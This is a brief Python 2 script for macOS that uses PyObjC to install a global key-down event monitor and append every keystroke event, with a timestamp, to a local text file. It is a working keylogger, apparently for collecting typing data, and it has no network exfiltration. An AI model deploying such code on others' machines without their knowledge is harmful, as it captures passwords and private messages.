from Cocoa import *
from Foundation import *
from PyObjCTools import AppHelper
import string
import sys
from time import gmtime, strftime


class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, aNotification):
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(NSKeyDownMask, handler)

def handler(event):
    try:
        if event.type() == NSKeyDown:
            with open('./raw_data/output.txt', 'a+') as f:
                f.write(strftime("%Y-%m-%d %H:%M:%S", gmtime()) + " " + str(event) + "\n")
    except ( KeyboardInterrupt ) as e:
        print e
        AppHelper.stopEventLoop()
        exit(1)

def main():
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()


if __name__ == '__main__':
    main()
